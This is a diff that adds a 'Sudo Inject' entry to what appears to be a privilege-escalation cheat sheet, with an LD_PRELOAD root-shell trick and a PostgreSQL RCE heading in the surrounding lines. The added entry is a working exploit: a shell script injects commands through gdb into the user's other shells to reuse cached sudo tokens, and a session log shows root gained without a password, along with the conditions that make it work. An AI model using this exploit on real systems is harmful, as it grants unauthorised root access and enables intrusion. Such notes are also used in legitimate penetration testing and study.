@@ -534,6 +534,37 @@ void _init() {
 }
 ```
 Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
+###### Sudo Inject
+```
+$ sudo whatever
+[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+exploit.sh
+```
+#!/bin/sh
+# create an invalid sudo entry for the current shell
+echo | sudo -S >/dev/null 2>&1
+echo "Current process : $$"
+cp activate_sudo_token /tmp/
+chmod +x activate_sudo_token
+# timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')
+# inject all shell belonging to the current user, our shell one :p
+for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")
+do
+        echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")
+        echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' \
+                | gdb -q -n -p "$pid" >/dev/null 2>&1
+done
+```
+Requirements
+Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
+Current user must have living process that has a valid sudo token with the same uid.  
+>The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
 ###### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
